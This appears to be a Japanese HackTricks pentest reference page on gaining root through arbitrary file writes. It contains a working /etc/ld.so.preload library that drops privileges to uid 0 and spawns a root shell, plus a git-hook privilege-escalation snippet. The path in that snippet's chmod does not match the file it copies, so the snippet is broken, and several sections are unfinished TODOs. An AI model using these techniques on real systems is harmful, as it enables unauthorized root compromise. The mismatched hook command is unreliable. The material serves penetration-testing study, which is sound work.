# ルートへの任意のファイル書き込み

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

このファイルは**`LD_PRELOAD`**環境変数のように動作しますが、**SUIDバイナリ**でも機能します。\
これを作成または変更できる場合、実行される各バイナリと共に読み込まれる**ライブラリへのパスを追加するだけです**。

例えば: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) は、コミットが作成されるときやマージなど、git リポジトリ内のさまざまな **イベント** で **実行される** **スクリプト** です。したがって、**特権スクリプトまたはユーザー** がこれらのアクションを頻繁に実行し、`.git` フォルダーに **書き込む** ことが可能であれば、これを **privesc** に利用できます。

たとえば、git リポジトリの **`.git/hooks`** に **スクリプト** を **生成** することが可能であり、新しいコミットが作成されるたびに常に実行されます：
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron & Time files

TODO

### Service & Socket files

TODO

### binfmt_misc

`/proc/sys/fs/binfmt_misc` にあるファイルは、どのバイナリがどのタイプのファイルを実行すべきかを示します。TODO: 一般的なファイルタイプが開かれたときにリバースシェルを実行するためにこれを悪用する要件を確認してください。

{{#include ../../banners/hacktricks-training.md}}
